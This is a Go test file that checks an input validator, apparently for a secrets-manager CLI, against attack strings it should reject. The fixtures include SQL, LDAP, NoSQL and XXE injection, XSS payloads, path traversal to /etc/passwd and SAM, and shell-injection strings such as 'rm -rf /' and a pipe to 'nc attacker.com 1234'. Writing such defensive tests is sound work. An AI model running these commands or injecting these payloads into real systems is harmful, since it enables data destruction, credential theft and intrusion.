package validation

import (
	"strings"
	"testing"
)

// TestValidator_SecurityAttackVectors tests various security attack vectors
func TestValidator_SecurityAttackVectors(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name        string
		testFunc    func(string) error
		input       string
		expectError bool
		description string
	}{
		// SQL Injection Tests
		{
			name:        "SQL injection - DROP TABLE",
			testFunc:    v.ValidateUID,
			input:       "'; DROP TABLE users; --",
			expectError: true,
			description: "Should reject SQL injection attempt",
		},
		{
			name:        "SQL injection - UNION SELECT",
			testFunc:    v.ValidateSearchQuery,
			input:       "' UNION SELECT * FROM passwords --",
			expectError: true,
			description: "Should reject SQL union injection",
		},
		{
			name:        "SQL injection - OR 1=1",
			testFunc:    v.ValidateProfileName,
			input:       "admin' OR '1'='1",
			expectError: true,
			description: "Should reject SQL boolean injection",
		},

		// Command Injection Tests
		{
			name:        "Command injection - semicolon",
			testFunc:    v.ValidateFilePath,
			input:       "/tmp/file; rm -rf /",
			expectError: true,
			description: "Should reject command chaining",
		},
		{
			name:        "Command injection - backticks",
			testFunc:    v.ValidateSearchQuery,
			input:       "`whoami`",
			expectError: true,
			description: "Should reject command substitution",
		},
		{
			name:        "Command injection - $() syntax",
			testFunc:    v.ValidateTitle,
			input:       "$(cat /etc/passwd)",
			expectError: true,
			description: "Should reject command substitution",
		},
		{
			name:        "Command injection - pipe",
			testFunc:    v.ValidateSearchQuery,
			input:       "test | nc attacker.com 1234",
			expectError: true,
			description: "Should reject pipe commands",
		},
		{
			name:        "Command injection - newline",
			testFunc:    v.ValidateTitle,
			input:       "test\ncat /etc/passwd",
			expectError: true,
			description: "Should reject newline injection",
		},

		// Path Traversal Tests
		{
			name:        "Path traversal - parent directory",
			testFunc:    v.ValidateFilePath,
			input:       "../../../etc/passwd",
			expectError: true,
			description: "Should reject path traversal",
		},
		{
			name:        "Path traversal - encoded",
			testFunc:    v.ValidateFilePath,
			input:       "..%2F..%2F..%2Fetc%2Fpasswd",
			expectError: true,
			description: "Should reject encoded path traversal",
		},
		{
			name:        "Path traversal - Windows",
			testFunc:    v.ValidateFilePath,
			input:       "..\\..\\..\\windows\\system32\\config\\sam",
			expectError: true,
			description: "Should reject Windows path traversal",
		},

		// XSS Tests
		{
			name:        "XSS - script tag",
			testFunc:    v.ValidateTitle,
			input:       "<script>alert('XSS')</script>",
			expectError: true,
			description: "Should reject script tags",
		},
		{
			name:        "XSS - img onerror",
			testFunc:    v.ValidateNotes,
			input:       `<img src=x onerror="alert('XSS')">`,
			expectError: true,
			description: "Should reject event handlers",
		},
		{
			name:        "XSS - javascript protocol",
			testFunc:    v.ValidateURL,
			input:       "javascript:alert('XSS')",
			expectError: true,
			description: "Should reject javascript protocol",
		},
		{
			name:        "XSS - data URL",
			testFunc:    v.ValidateURL,
			input:       "data:text/html,<script>alert('XSS')</script>",
			expectError: true,
			description: "Should reject data URLs with scripts",
		},

		// LDAP Injection Tests
		{
			name:        "LDAP injection - wildcard",
			testFunc:    v.ValidateSearchQuery,
			input:       "*)(uid=*",
			expectError: true,
			description: "Should reject LDAP wildcards",
		},
		{
			name:        "LDAP injection - attributes",
			testFunc:    v.ValidateUsername,
			input:       "admin)(|(uid=*",
			expectError: true,
			description: "Should reject LDAP filter injection",
		},

		// NoSQL Injection Tests
		{
			name:        "NoSQL injection - $ne",
			testFunc:    v.ValidateSearchQuery,
			input:       `{"$ne": null}`,
			expectError: true,
			description: "Should reject NoSQL operators",
		},
		{
			name:        "NoSQL injection - $regex",
			testFunc:    v.ValidateSearchQuery,
			input:       `{"$regex": ".*"}`,
			expectError: true,
			description: "Should reject NoSQL regex",
		},

		// XML Injection Tests
		{
			name:        "XML injection - entity",
			testFunc:    v.ValidateNotes,
			input:       `<!ENTITY xxe SYSTEM "file:///etc/passwd">`,
			expectError: true,
			description: "Should reject XML entities",
		},
		{
			name:        "XML injection - CDATA",
			testFunc:    v.ValidateNotes,
			input:       `<![CDATA[<script>alert('XSS')</script>]]>`,
			expectError: true,
			description: "Should reject CDATA sections",
		},

		// Unicode/Encoding Attacks
		{
			name:        "Unicode - null byte",
			testFunc:    v.ValidateFilePath,
			input:       "/tmp/file\x00.txt",
			expectError: true,
			description: "Should reject null bytes",
		},
		{
			name:        "Unicode - RTL override",
			testFunc:    v.ValidateTitle,
			input:       "test\u202Egnp.exe",
			expectError: true,
			description: "Should reject RTL override characters",
		},
		{
			name:        "Unicode - homograph",
			testFunc:    v.ValidateURL,
			input:       "https://gооgle.com", // Using Cyrillic 'о'
			expectError: false,                // URLs should be validated differently
			description: "Should handle homograph attacks",
		},

		// Buffer Overflow Tests
		{
			name:        "Buffer overflow - long string",
			testFunc:    v.ValidateTitle,
			input:       strings.Repeat("A", 10000),
			expectError: true,
			description: "Should reject extremely long inputs",
		},
		{
			name:        "Buffer overflow - repeated pattern",
			testFunc:    v.ValidateNotes,
			input:       strings.Repeat("A%n", 1000),
			expectError: true,
			description: "Should reject format string patterns",
		},

		// Special Character Tests
		{
			name:        "Special chars - all dangerous",
			testFunc:    v.ValidateSearchQuery,
			input:       `<>'";&|$(){}[]!#%`,
			expectError: true,
			description: "Should reject queries with all dangerous chars",
		},
		{
			name:        "Special chars - mixed with valid",
			testFunc:    v.ValidateTitle,
			input:       "Valid Title; rm -rf /",
			expectError: true,
			description: "Should reject mixed valid/invalid input",
		},

		// Valid Inputs (should pass)
		{
			name:        "Valid UID",
			testFunc:    v.ValidateUID,
			input:       "NJ_xXSkk3xYI1h9ql5lAiQ",
			expectError: false,
			description: "Should accept valid UID",
		},
		{
			name:        "Valid title",
			testFunc:    v.ValidateTitle,
			input:       "My Company's Database (Production)",
			expectError: false,
			description: "Should accept valid title with allowed special chars",
		},
		{
			name:        "Valid file path",
			testFunc:    v.ValidateFilePath,
			input:       "/home/user/documents/report.pdf",
			expectError: false,
			description: "Should accept valid absolute path",
		},
		{
			name:        "Valid URL",
			testFunc:    v.ValidateURL,
			input:       "https://example.com:8443/path?query=value",
			expectError: false,
			description: "Should accept valid HTTPS URL",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.testFunc(tt.input)

			if tt.expectError && err == nil {
				t.Errorf("%s: expected error but got none", tt.description)
			} else if !tt.expectError && err != nil {
				t.Errorf("%s: unexpected error: %v", tt.description, err)
			}
		})
	}
}

// TestValidator_ShellEscapingSecurity tests shell escaping security
func TestValidator_ShellEscapingSecurity(t *testing.T) {
	v := NewValidator()

	dangerousInputs := []string{
		`'; rm -rf / #`,
		`" && cat /etc/passwd"`,
		"$(echo pwned)",
		"`id`",
		"test\nwhoami",
		"test\rwhoami",
		`test'; echo $PATH'`,
		`test" || echo "pwned`,
		"test`date`",
		"test${IFS}whoami",
		"test;id;",
		"test|id",
		"test&id",
		"test>>/tmp/evil",
		"test</etc/passwd",
		`test\"; cat /etc/passwd; echo \"`,
	}

	for _, input := range dangerousInputs {
		t.Run(input, func(t *testing.T) {
			escaped := v.escapeShellArg(input)

			// Check that dangerous characters are escaped
			dangerousChars := []string{";", "|", "&", "$", "`", "(", ")", "<", ">", "\n", "\r", "\"", "'"}
			for _, char := range dangerousChars {
				if strings.Contains(input, char) && strings.Contains(escaped, char) {
					// If the dangerous character is still present, it should be escaped
					if !strings.Contains(escaped, "\\"+char) && !strings.Contains(escaped, "'") {
						t.Errorf("dangerous character %q not properly escaped in %q", char, escaped)
					}
				}
			}

			// Ensure the escaped string is single-quoted
			if !strings.HasPrefix(escaped, "'") || !strings.HasSuffix(escaped, "'") {
				t.Errorf("escaped string should be single-quoted: %s", escaped)
			}
		})
	}
}

// TestValidator_KSMNotationSecurity tests KSM notation validation security
func TestValidator_KSMNotationSecurity(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		notation    string
		expectError bool
		description string
	}{
		// Injection attempts
		{
			notation:    "UID/field/password; rm -rf /",
			expectError: true,
			description: "Command injection in field",
		},
		{
			notation:    "UID/field/../../../etc/passwd",
			expectError: true,
			description: "Path traversal in field",
		},
		{
			notation:    "UID/field/<script>alert('xss')</script>",
			expectError: true,
			description: "XSS in field name",
		},
		{
			notation:    "UID/field/password[$(whoami)]",
			expectError: true,
			description: "Command substitution in array index",
		},
		{
			notation:    "UID/field/password[0]['; DROP TABLE; --']",
			expectError: true,
			description: "SQL injection in property",
		},

		// Valid notations
		{
			notation:    "NJ_xXSkk3xYI1h9ql5lAiQ/field/password",
			expectError: false,
			description: "Valid simple notation",
		},
		{
			notation:    "NJ_xXSkk3xYI1h9ql5lAiQ/custom_field/apiKey[0]",
			expectError: false,
			description: "Valid array notation",
		},
		{
			notation:    "My Database/field/url",
			expectError: false,
			description: "Valid title-based notation",
		},
	}

	for _, tt := range tests {
		t.Run(tt.description, func(t *testing.T) {
			err := v.ValidateKSMNotation(tt.notation)

			if tt.expectError && err == nil {
				t.Errorf("expected error for %s", tt.description)
			} else if !tt.expectError && err != nil {
				t.Errorf("unexpected error for %s: %v", tt.description, err)
			}
		})
	}
}

// TestValidator_MaxLengthEnforcement tests maximum length enforcement
func TestValidator_MaxLengthEnforcement(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name        string
		testFunc    func(string) error
		maxLength   int
		input       string
		expectError bool
	}{
		{
			name:        "Title at max length",
			testFunc:    v.ValidateTitle,
			maxLength:   255,
			input:       strings.Repeat("A", 255),
			expectError: false,
		},
		{
			name:        "Title over max length",
			testFunc:    v.ValidateTitle,
			maxLength:   255,
			input:       strings.Repeat("A", 256),
			expectError: true,
		},
		{
			name:        "Notes at reasonable length",
			testFunc:    v.ValidateNotes,
			maxLength:   10000,
			input:       strings.Repeat("A", 5000),
			expectError: false,
		},
		{
			name:        "Notes over max length",
			testFunc:    v.ValidateNotes,
			maxLength:   10000,
			input:       strings.Repeat("A", 10001),
			expectError: true,
		},
		{
			name:        "Search query reasonable",
			testFunc:    v.ValidateSearchQuery,
			maxLength:   256,
			input:       strings.Repeat("A", 100),
			expectError: false,
		},
		{
			name:        "Search query too long",
			testFunc:    v.ValidateSearchQuery,
			maxLength:   256,
			input:       strings.Repeat("A", 257),
			expectError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.testFunc(tt.input)

			if tt.expectError && err == nil {
				t.Error("expected error for input exceeding max length")
			} else if !tt.expectError && err != nil {
				t.Errorf("unexpected error: %v", err)
			}
		})
	}
}
